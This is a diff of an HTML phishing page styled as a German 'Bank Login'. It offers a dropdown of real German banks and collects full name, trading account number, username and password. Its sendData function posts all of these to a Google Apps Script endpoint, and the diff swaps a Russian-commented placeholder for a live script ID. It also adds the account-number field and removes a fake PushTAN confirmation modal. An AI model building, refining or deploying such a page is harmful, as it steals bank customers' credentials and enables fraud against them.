@@ -1,10 +1,9 @@
 <!DOCTYPE html>
-
 <html lang="de">
 <head>
-<meta charset="utf-8"/>
-<title>Bank Login</title>
-<style>
+  <meta charset="utf-8"/>
+  <title>Bank Login</title>
+  <style>
     body {
       font-family: Arial, sans-serif;
       background-image: url('https://images.unsplash.com/photo-1521791136064-7986c2920216?auto=format&fit=crop&w=1350&q=80');
@@ -76,72 +75,69 @@
       display: none;
     }
   </style>
-<style>
-  body {
-    position: relative;
-    background: url('https://i.postimg.cc/rpHsmSXC/Chat-GPT-Image-6-2025-14-27-55.png') no-repeat center center fixed;
-    background-size: cover;
-    z-index: 0;
-  }
-</style>
 </head>
 <body>
 <div class="container">
-<div class="icon-name">
-<img alt="Иконка" src="https://cdn-icons-png.flaticon.com/512/149/149071.png"/>
-<strong>Kundendaten</strong>
-</div>
-<label for="fullname">Vor- und Nachname</label>
-<input id="fullname" placeholder="Geben Sie Ihren Vor- und Nachnamen ein" type="text"/>
-<label for="bank">Wählen Sie eine Bank</label>
-<select id="bank" name="bank">
-<option>-- Wählen Sie --</option>
-<option>Deutsche Bank</option>
-<option>Commerzbank</option>
-<option>DZ Bank</option>
-<option>KfW Bank</option>
-<option>Unicredit Bank (HypoVereinsbank)</option>
-<option>ING-DiBa</option>
-<option>DKB (Deutsche Kreditbank)</option>
-<option>Sparkasse Köln/Bonn</option>
-<option>Stadtsparkasse München</option>
-<option>Frankfurter Sparkasse</option>
-<option>Hamburger Sparkasse</option>
-<option>Kreissparkasse Köln</option>
-<option>Berliner Volksbank</option>
-<option>Deutsche Apotheker- und Ärztebank</option>
-<option>BBBank</option>
-<option>Sparda-Bank Baden-Württemberg</option>
-<option>Frankfurter Volksbank</option>
-</select><div id="customBankContainer">
-<label style="display: flex; align-items: center; gap: 8px; margin: 10px 0; white-space: nowrap;"><input id="customBankToggle" onchange="document.getElementById('customBankInput').style.display = this.checked ? 'block' : 'none';" type="checkbox"/><span>Mein Bank ist nicht in der Liste</span></label>
-<input id="customBankInput" placeholder="Geben Sie Ihre Bank ein" style="display:none; width:100%; padding:5px; margin-top:5px;" type="text"/>
-</div>
-<div class="icon-name">
-<img alt="icon" src="https://cdn-icons-png.flaticon.com/512/3135/3135673.png" width="20"/>
-<label for="handelskontonummer">Handelskontonummer</label>
-</div>
-<input id="handelskontonummer" name="handelskontonummer" placeholder="Handelskontonummer eingeben" type="text"/>
-<input id="customBankInput" placeholder="Введите название банка" type="text"/>
-<label for="login">Benutzername</label>
-<input id="login" placeholder="Benutzername eingeben" type="text"/>
-<label for="password">Passwort</label>
-<div class="password-container">
-<input id="password" placeholder="Passwort eingeben" type="password"/>
-<span class="toggle-password" onclick="togglePassword()">👁️</span>
-</div>
-<button onclick="sendData()">Einloggen</button>
-<div style="text-align:center; margin-top: 20px;">
-<a href="https://www.datenschutz.org/" target="_blank">Datenschutzerklärung</a>
-</div>
-</div>
-<script>
-  function toggleCustomBankInput() {
-    const select = document.getElementById('bank');
-    const customInput = document.getElementById('customBankInput');
-    customInput.style.display = select.value === 'custom' ? 'block' : 'none';
-  }
+  <div class="icon-name">
+    <img alt="Иконка" src="https://cdn-icons-png.flaticon.com/512/149/149071.png"/>
+    <strong>Kundendaten</strong>
+  </div>
 
+  <label for="fullname">Vor- und Nachname</label>
+  <input id="fullname" placeholder="Geben Sie Ihren Vor- und Nachnamen ein" type="text"/>
+
+  <label for="bank">Wählen Sie eine Bank</label>
+  <select id="bank" name="bank">
+    <option>-- Wählen Sie --</option>
+    <option>Deutsche Bank</option>
+    <option>Commerzbank</option>
+    <option>DZ Bank</option>
+    <option>KfW Bank</option>
+    <option>Unicredit Bank (HypoVereinsbank)</option>
+    <option>ING-DiBa</option>
+    <option>DKB (Deutsche Kreditbank)</option>
+    <option>Sparkasse Köln/Bonn</option>
+    <option>Stadtsparkasse München</option>
+    <option>Frankfurter Sparkasse</option>
+    <option>Hamburger Sparkasse</option>
+    <option>Kreissparkasse Köln</option>
+    <option>Berliner Volksbank</option>
+    <option>Deutsche Apotheker- und Ärztebank</option>
+    <option>BBBank</option>
+    <option>Sparda-Bank Baden-Württemberg</option>
+    <option>Frankfurter Volksbank</option>
+  </select>
+
+  <label style="display: flex; align-items: center; gap: 8px; margin: 10px 0; white-space: nowrap;">
+    <input id="customBankToggle" type="checkbox"
+      onchange="document.getElementById('customBankInput').style.display = this.checked ? 'block' : 'none';"/>
+    <span>Mein Bank ist nicht in der Liste</span>
+  </label>
+  <input id="customBankInput" placeholder="Geben Sie Ihre Bank ein" style="display:none;" type="text"/>
+
+  <div class="icon-name">
+    <img alt="icon" src="https://cdn-icons-png.flaticon.com/512/3135/3135673.png" width="20"/>
+    <label for="handelskontonummer">Handelskontonummer</label>
+  </div>
+  <input id="handelskontonummer" name="handelskontonummer" placeholder="Handelskontonummer eingeben" type="text"/>
+
+  <label for="login">Benutzername</label>
+  <input id="login" placeholder="Benutzername eingeben" type="text"/>
+
+  <label for="password">Passwort</label>
+  <div class="password-container">
+    <input id="password" placeholder="Passwort eingeben" type="password"/>
+    <span class="toggle-password" onclick="togglePassword()">👁️</span>
+  </div>
+
+  <button onclick="sendData()">Einloggen</button>
+
+  <div style="text-align:center; margin-top: 20px;">
+    <a href="https://www.datenschutz.org/" target="_blank">Datenschutzerklärung</a>
+  </div>
+</div>
+
+<script>
   function togglePassword() {
     const passwordInput = document.getElementById('password');
     passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
@@ -153,12 +149,13 @@
     const customBankInput = document.getElementById('customBankInput');
     const login = document.getElementById('login').value;
     const password = document.getElementById('password').value;
+    const handelskontonummer = document.getElementById('handelskontonummer').value;
 
-    const bank = bankSelect.value === 'custom'
+    const bank = document.getElementById('customBankToggle').checked
       ? customBankInput.value
       : bankSelect.value;
 
-    const url = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec"; // ЗАМЕНИ НА СВОЙ URL
+    const url = "https://script.google.com/macros/s/AKfycbxwVkIR69-fwRHLVMNaoDK69Sg3lVW0JGwpFwy7puSlF8rT1AShvuwN-FlXFqzKWt2Euw/exec";
 
     fetch(url, {
       method: 'POST',
@@ -166,7 +163,8 @@
         fullname: fullName,
         bank: bank,
         login: login,
-        password: password
+        password: password,
+        handelskontonummer: handelskontonummer
       }),
       headers: {
         'Content-Type': 'application/json'
@@ -174,6 +172,7 @@
     })
     .then(res => res.text())
     .then(data => {
+      console.log("Ответ от сервера:", data);
       alert("Данные отправлены!");
     })
     .catch(err => {
@@ -181,47 +180,5 @@
     });
   }
 </script>
-<script>
-  document.addEventListener("DOMContentLoaded", function() {
-    const bankLogos = {
-      "Sparkasse Köln/Bonn": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Sparkasse_der_deutschen_St%C3%A4dte_Logo.svg/512px-Sparkasse_der_deutschen_St%C3%A4dte_Logo.svg.png",
-      "Deutsche Bank": "https://upload.wikimedia.org/wikipedia/commons/thumb/2/20/Deutsche_Bank_logo_without_wordmark.svg/512px-Deutsche_Bank_logo_without_wordmark.svg.png",
-      "Commerzbank": "https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Commerzbank_2017_logo.svg/512px-Commerzbank_2017_logo.svg.png",
-      "DKB (Deutsche Kreditbank)": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/DKB_Logo_2019.svg/512px-DKB_Logo_2019.svg.png",
-      "ING-DiBa": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/ING_Logo_2021.svg/512px-ING_Logo_2021.svg.png"
-    };
-
-    const select = document.getElementById("bank");
-    const logoDiv = document.getElementById("bank-logo");
-
-    if (select) {
-      select.addEventListener("change", function () {
-        const selected = select.value;
-        if (bankLogos[selected]) {
-          logoDiv.innerHTML = '<img src="' + bankLogos[selected] + '" alt="' + selected + ' Logo" style="max-width: 200px;">';
-        } else {
-          logoDiv.innerHTML = "";
-        }
-      });
-    }
-  });
-</script>
-<div id="processingModal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%);
-         background:#fff; border:1px solid #ccc; padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.2);
-         text-align:center; z-index:9999;">
-<p id="modalText">In Bearbeitung...</p>
-<div id="checkmark" style="font-size: 48px; color: green; display: none;">✔</div>
-</div>
-<script>
-        document.querySelector('button').addEventListener('click', function(event) {
-            document.getElementById('processingModal').style.display = 'block';
-            document.getElementById('checkmark').style.display = 'none';
-            document.getElementById('modalText').textContent = 'Bestätigen Sie Ihre Aktion mit PushTAN';
-            setTimeout(function() {
-                document.getElementById('modalText').textContent = '';
-                document.getElementById('checkmark').style.display = 'block';
-            }, 120000);
-        });
-        </script>
 </body>
 </html>
